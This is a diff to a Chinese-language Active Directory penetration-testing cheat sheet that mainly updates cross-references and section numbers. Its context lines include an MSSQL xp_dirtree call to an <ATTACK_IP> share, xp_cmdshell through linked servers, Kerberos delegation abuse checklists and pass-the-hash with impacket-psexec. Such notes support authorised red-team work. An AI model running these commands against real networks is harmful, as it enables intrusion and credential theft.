@@ -14,7 +14,7 @@ metadata: { domain: ad-win, tier: T1 }
 ```
 [ ] 时钟同步: ntpdate -b <DC_IP>  ← 🔴 所有 Kerberos 操作的前提！
 [ ] 隧道验证: ss -tlnp | grep <代理端口>; ps aux | grep chisel
-[ ] 凭据去交互: 所有密码/hash/TGT 立即存文件，见 deinteractive-credentials
+[ ] 凭据去交互: 所有密码/hash/TGT 立即存文件，见 credential-spraying-password-reuse
 [ ] 工具认证模式: 每个新工具第一次认证失败 → --help 确认支持的认证方式
 ```
 
@@ -140,6 +140,7 @@ xfreerdp /v:HOST.DOMAIN /u:user /cert:ignore /kerberos:auto
 full address:s:IP
 username:s:DOMAIN\user
 ```
+（RDP 注入见 rdp-inception 卡）
 
 ---
 
@@ -150,7 +151,7 @@ username:s:DOMAIN\user
 [ ] 约束委派:      Get-NetUser -TrustedToAuth → 伪造 S4U2Proxy
 [ ] RBCD:           GenericWrite/WriteDacl → 添加 msDS-AllowedToActOnBehalfOfOtherIdentity
 [ ] Shadow Credentials: GenericWrite → 添加 msDS-KeyCredentialLink → PKINIT
-# 详细命令见 ad-checklist §3 / §5 / §8
+# 详细命令见 ad-checklist §3 / §5
 ```
 
 ---
@@ -173,6 +174,7 @@ EXEC master..xp_dirtree '\\<ATTACK_IP>\share';
 SELECT * FROM openquery("LINKED_SERVER", 'SELECT @@version');
 EXEC ('EXEC xp_cmdshell ''whoami''') AT "LINKED_SERVER";
 ```
+（完整链见 mssql-attack-chain 卡）
 
 ---
 
@@ -228,7 +230,7 @@ proxychains -q impacket-psexec INTERNAL_DOMAIN/user@INTERNAL_IP -hashes :<HASH>
 
 ---
 
-## 10. 横向决策树
+## 11. 横向决策树
 
 ```
 有 NT hash → PtH (PSExec/WMIExec/WinRM)
